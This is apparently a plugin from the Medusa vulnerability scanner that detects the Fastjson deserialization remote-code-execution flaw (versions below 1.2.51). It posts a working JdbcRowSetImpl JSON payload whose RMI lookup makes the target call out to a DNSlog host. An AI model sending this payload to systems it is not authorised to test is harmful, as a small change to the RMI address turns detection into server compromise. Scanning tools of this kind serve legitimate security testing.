#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
import requests
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,Dnslog,ErrorHandling,Proxies
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-3-4"  # 插件编辑时间
        self.info['disclosure'] = '2019-7-10'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "FastjsonDeserializationRemoteCodeExecutionVulnerability3"  # 插件名称
        self.info['name'] ='Fastjson反序列化远程代码执行漏洞3' #漏洞名称
        self.info['affects'] = "Fastjson"  # 漏洞组件
        self.info['desc_content'] = "攻击者可通过精心构造的JSON数据实现远程代码执行，可造成服务器被攻陷"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "Fastjson<1.2.51"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新Fastjson版本"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload_url = scheme + '://' + url + ':' + str(port)
        DL=Dnslog()
        #DL="dsada11111sda.xhqp3u.dnslog.cn"
        data ='''{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://%s/Exploit","autoCommit":true}'''%DL.dns_host()

        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/json',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            "Connection": "close",
            "Accept-Encoding": "gzip, deflate"
        }
        resp = requests.post(payload_url, headers=headers, data=data, proxies=proxies,timeout=10, verify=False)
        if DL.result() and resp.status_code==400:
            Medusa = "{}存在Fastjson反序列化远程代码执行漏洞\r\n 验证数据:\r\n漏洞位置:{}\r\n返回数据:{}\r\nDNSlong:{}\r\n".format(url,
                                                                                                          payload_url,
                                                                                                          resp.text,DL.dns_host())
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

